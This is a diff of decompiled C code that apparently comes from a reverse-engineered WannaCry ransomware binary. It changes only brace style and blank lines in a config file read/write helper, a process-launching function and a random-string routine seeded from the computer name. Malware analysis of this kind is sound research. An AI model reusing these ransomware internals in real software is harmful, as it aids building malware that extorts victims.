@@ -758,19 +758,16 @@ uint __cdecl FUN_00401000(void *param_1,int param_2) {
   
   if (param_2 == 0) {
     _Mode = &DAT_0040e018;
-  }
-  else {
+  } else {
     _Mode = &DAT_0040e01c;
   }
   _File = fopen(s_c_wnry_0040e010,_Mode);
   if (_File == (FILE *)0x0) {
     uVar1 = 0;
-  }
-  else {
+  } else {
     if (param_2 == 0) {
       sVar2 = fwrite(param_1,0x30c,1,_File);
-    }
-    else {
+    } else {
       sVar2 = fread(param_1,0x30c,1,_File);
     }
     uVar1 = (uint)(sVar2 != 0);
@@ -791,11 +788,13 @@ undefined4 __cdecl run_command(LPSTR param_1,DWORD param_2,LPDWORD param_3) {
   iVar3 = 0x10;
   local_58.cb = 0x44;
   ppCVar4 = &local_58.lpReserved;
+  
   while (iVar3 != 0) {
     iVar3 = iVar3 + -1;
     *ppCVar4 = (LPSTR)0x0;
     ppCVar4 = ppCVar4 + 1;
   }
+  
   local_14.hProcess = (HANDLE)0x0;
   local_14.hThread = (HANDLE)0x0;
   local_14.dwProcessId = 0;
@@ -954,6 +953,7 @@ void __cdecl randomstring_generator(char *randomstring_output) {
   local_8 = 0;
   _Seed = 1;
   computername_len = wcslen((wchar_t *)&computername);
+  
   if (computername_len != 0) {
     computername_ptr = &computername;
     do {
